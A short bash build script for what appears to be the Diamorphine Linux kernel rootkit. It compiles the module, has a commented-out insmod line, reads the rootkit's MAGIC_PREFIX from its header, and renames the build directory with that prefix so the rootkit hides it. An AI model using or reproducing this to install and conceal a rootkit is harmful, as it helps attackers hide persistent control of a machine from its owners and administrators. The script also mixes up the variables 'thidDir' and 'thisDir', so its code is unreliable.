#!/bin/bash

make

koFile=diamorphine.ko
hFile=diamorphine.h
if test -f "$koFile"; then #testing if .ko was built properly
    #sudo insmod "$koFile"
    magicPrefix=$(awk '/MAGIC_PREFIX/{print $3}' "$hFile" | tr -d '"')
    thidDirPath=$(pwd)
    thidDir=${PWD##*/}
    mv "$thidDirPath" '../'"$magicPrefix""$thisDir"

    echo "built."
fi